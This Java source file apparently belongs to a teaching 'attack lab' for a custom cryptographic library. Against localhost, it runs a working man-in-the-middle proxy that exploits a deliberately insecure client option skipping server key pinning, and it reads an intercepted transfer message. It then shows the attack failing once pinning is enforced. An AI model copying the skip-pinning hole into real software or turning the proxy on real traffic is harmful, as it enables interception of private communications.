package com.pqcaps.attacklab;

import com.pqcaps.classical.ClassicalCryptoSuite;
import com.pqcaps.classical.ClassicalHandshake;
import com.pqcaps.classical.ClassicalSecureChannel;
import com.pqcaps.common.HandshakeConfig;
import com.pqcaps.common.SessionKeys;

import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * ATTACK 2: Man-In-The-Middle (MITM) Attack (exploits VULN-4).
 *
 * <p><b>The Weakness</b>: The client can run in an insecure mode that skips server
 * public key pinning ({@code HandshakeConfig.skipKeyPinning = true}).
 *
 * <p><b>The Attack</b>: The attacker sets up a proxy between client and server.
 * The proxy conducts two separate handshakes:
 * <ol>
 *   <li>Handshake 1: Proxy &lt;--&gt; Client using the attacker's own RSA keypair.</li>
 *   <li>Handshake 2: Proxy &lt;--&gt; Server acting as a client to the real server.</li>
 * </ol>
 * Because the client skips key pinning, it blindly trusts the attacker's public key.
 * The attacker decrypts, reads, and re-encrypts all messages in both directions without
 * detection.
 *
 * <p>When key pinning is turned ON (safe mode), the client verifies the signature
 * against the real server's pinned key and aborts immediately.
 */
public final class MitmAttack {

    private static final String LOCALHOST = "127.0.0.1";

    public static void main(String[] args) {
        System.out.println("======================================================================");
        System.out.println("  ATTACK 2: Man-In-The-Middle (MITM) Attack (exploiting VULN-4)");
        System.out.println("======================================================================");

        System.out.println("\n--- Step 1: Running with insecure client (skipKeyPinning=true) ---");
        AttackResult vulnResult = execute(true);
        System.out.println("Vulnerable Mode Success : " + vulnResult.success());
        System.out.println("Evidence                : " + vulnResult.evidence());

        System.out.println("\n--- Step 2: Running with secure client (skipKeyPinning=false) ---");
        AttackResult safeResult = execute(false);
        System.out.println("Secure Mode Success     : " + safeResult.success() + " (attack should be blocked)");
        System.out.println("Evidence                : " + safeResult.evidence());
    }

    /**
     * Executes the MITM attack.
     *
     * @param skipKeyPinning if true, client skips key pinning (VULN-4 active);
     *                       if false, client enforces server key pinning.
     * @return the AttackResult summarizing whether the MITM succeeded in intercepting plaintext.
     */
    public static AttackResult execute(boolean skipKeyPinning) {
        ensureLocalhost();
        KeyPair realServerIdentity = ClassicalCryptoSuite.getInstance().signatureScheme().generateKeyPair();
        KeyPair attackerIdentity   = ClassicalCryptoSuite.getInstance().signatureScheme().generateKeyPair();

        HandshakeConfig serverConfig = HandshakeConfig.vulnerable();
        HandshakeConfig clientConfig = HandshakeConfig.vulnerable().withSkipKeyPinning(skipKeyPinning);

        CountDownLatch serverReady = new CountDownLatch(1);
        CountDownLatch proxyReady  = new CountDownLatch(1);
        int[] ports = new int[2]; // [0]=serverPort, [1]=proxyPort

        AtomicReference<String> interceptedC2S = new AtomicReference<>();
        AtomicReference<String> interceptedS2C = new AtomicReference<>();
        AtomicBoolean mitmSuccess = new AtomicBoolean(false);
        AtomicReference<String> failureReason = new AtomicReference<>();

        // ── 1. Real Server Thread ─────────────────────────────────────────────
        Thread serverThread = new Thread(() -> {
            try (ServerSocket ss = new ServerSocket(0, 50, java.net.InetAddress.getByName(LOCALHOST))) {
                ports[0] = ss.getLocalPort();
                serverReady.countDown();

                try (Socket conn = ss.accept()) {
                    SessionKeys keys = ClassicalHandshake.serverHandshake(conn, serverConfig, realServerIdentity);
                    try (ClassicalSecureChannel channel = new ClassicalSecureChannel(conn, keys, false, serverConfig)) {
                        byte[] clientMsg = channel.receive();
                        // Real server replies
                        channel.send("SERVER_ACK_TXN_ACCEPTED".getBytes(StandardCharsets.UTF_8));
                    }
                }
            } catch (Exception e) {
                // Connection closed or aborted
            }
        }, "mitm-server");
        serverThread.setDaemon(true);
        serverThread.start();

        // ── 2. MITM Attacker Proxy Thread ─────────────────────────────────────
        Thread proxyThread = new Thread(() -> {
            try {
                serverReady.await();
                try (ServerSocket proxySs = new ServerSocket(0, 50, java.net.InetAddress.getByName(LOCALHOST))) {
                    ports[1] = proxySs.getLocalPort();
                    proxyReady.countDown();

                    try (Socket clientSocket = proxySs.accept();
                         Socket serverSocket = new Socket(LOCALHOST, ports[0])) {

                        // Handshake with client as the fake server (using attacker's keypair)
                        SessionKeys keysClientProxy = ClassicalHandshake.serverHandshake(
                                clientSocket, HandshakeConfig.vulnerable(), attackerIdentity);

                        // Handshake with real server as a client
                        SessionKeys keysProxyServer = ClassicalHandshake.clientHandshake(
                                serverSocket, HandshakeConfig.vulnerable(), null);

                        // Secure channels on both legs
                        try (ClassicalSecureChannel channelCP = new ClassicalSecureChannel(clientSocket, keysClientProxy, false, HandshakeConfig.vulnerable());
                             ClassicalSecureChannel channelPS = new ClassicalSecureChannel(serverSocket, keysProxyServer, true, HandshakeConfig.vulnerable())) {

                            // Intercept Client -> Server message
                            byte[] rawC2S = channelCP.receive();
                            String plainC2S = new String(rawC2S, StandardCharsets.UTF_8);
                            interceptedC2S.set(plainC2S);
                            System.out.printf("[MITM PROXY] Intercepted C->S (hex4 ss=%s...): \"%s\"%n",
                                    ClassicalHandshake.hex4(keysClientProxy.clientToServer()), plainC2S);

                            // Forward to real server
                            channelPS.send(rawC2S);

                            // Intercept Server -> Client reply
                            byte[] rawS2C = channelPS.receive();
                            String plainS2C = new String(rawS2C, StandardCharsets.UTF_8);
                            interceptedS2C.set(plainS2C);
                            System.out.printf("[MITM PROXY] Intercepted S->C (hex4 ss=%s...): \"%s\"%n",
                                    ClassicalHandshake.hex4(keysProxyServer.serverToClient()), plainS2C);

                            // Forward to client
                            channelCP.send(rawS2C);
                            mitmSuccess.set(true);
                        }
                    }
                }
            } catch (Exception e) {
                failureReason.set(e.getMessage());
            }
        }, "mitm-proxy");
        proxyThread.setDaemon(true);
        proxyThread.start();

        // ── 3. Client Execution ───────────────────────────────────────────────
        try {
            proxyReady.await();
            try (Socket socket = new Socket(LOCALHOST, ports[1])) {
                SessionKeys keys = ClassicalHandshake.clientHandshake(
                        socket,
                        clientConfig,
                        realServerIdentity.getPublic() // Pinned server public key
                );

                try (ClassicalSecureChannel channel = new ClassicalSecureChannel(
                        socket, keys, true, clientConfig)) {
                    String secretMessage = "TRANSFER $50,000 FROM ACC-001 TO ACC-002";
                    channel.send(secretMessage.getBytes(StandardCharsets.UTF_8));
                    byte[] reply = channel.receive();
                }
            }
        } catch (SecurityException se) {
            failureReason.set("Client pinned key check triggered: " + se.getMessage());
        } catch (Exception e) {
            failureReason.set("Client handshake failed: " + e.getMessage());
        }

        try {
            serverThread.join(3000);
            proxyThread.join(3000);
        } catch (InterruptedException ignored) {}

        boolean success = mitmSuccess.get()
                && interceptedC2S.get() != null
                && interceptedC2S.get().contains("TRANSFER $50,000");

        String evidence = success
                ? String.format("MITM succeeded! Plaintext intercepted: C->S=\"%s\", S->C=\"%s\"",
                        interceptedC2S.get(), interceptedS2C.get())
                : "MITM blocked: " + failureReason.get();

        return new AttackResult(
                "Man-In-The-Middle Attack",
                success,
                evidence,
                "VULN-4"
        );
    }

    private static void ensureLocalhost() {
        if (!"127.0.0.1".equals(LOCALHOST)) {
            throw new SecurityException("Localhost only: 127.0.0.1 required!");
        }
    }
}
